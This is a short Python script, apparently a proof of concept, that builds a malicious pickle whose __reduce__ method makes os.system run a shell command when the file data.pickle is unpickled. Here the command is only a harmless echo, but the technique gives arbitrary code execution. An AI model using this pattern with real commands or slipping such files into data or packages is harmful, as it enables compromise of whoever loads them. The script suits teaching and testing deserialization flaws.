import pickle
import os


class MaliciousPayload:
    def __reduce__(self):
        # This method is called during unpickling.
        # We return os.system as the callable and a command as its argument.
        return os.system, ("echo Malicious code executed!",)


def generate_malicious_pickle():
    print("Generating malicious pickle payload...")
    malicious_object = MaliciousPayload()
    pickled_data = pickle.dumps(malicious_object)
    with open("data.pickle", "wb") as f:
        f.write(pickled_data)
    print("Malicious payload saved to data.pickle")


if __name__ == "__main__":
    generate_malicious_pickle()
